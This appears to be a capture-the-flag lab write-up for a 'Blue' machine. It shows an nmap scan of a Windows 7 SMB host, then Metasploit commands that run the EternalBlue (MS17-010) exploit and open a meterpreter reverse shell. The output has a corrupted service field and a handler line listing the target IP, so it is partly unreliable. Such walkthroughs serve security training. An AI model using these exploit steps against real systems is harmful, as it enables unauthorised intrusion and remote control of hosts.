### Blue machine
---
IP = {target_IP}

Nmap \
    `nmap -sC -sV -p- {target_IP} -oN nmap-initial`
```
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  55ae5960�  Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49157/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|*clock-skew: mean: 1h20m07s, deviation: 2h18m33s, median: 7s
|nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:55:83:b5 (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   2:1:0:
|    Message signing enabled but not required
| smb2-time:
|   date: 2024-04-07T01:02:07
|*  start_date: 2024-04-07T00:58:05
| smb-os-discovery:
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-06T21:02:07-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Start msfconsole:
```
msf6 > search ms17-010 
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST {target_IP}
RHOST => {target_IP}
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST {your_IP}
LHOST => {your_IP}
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on {target_IP}:{target_port} 
.....

meterpreter>
```

### Congrats!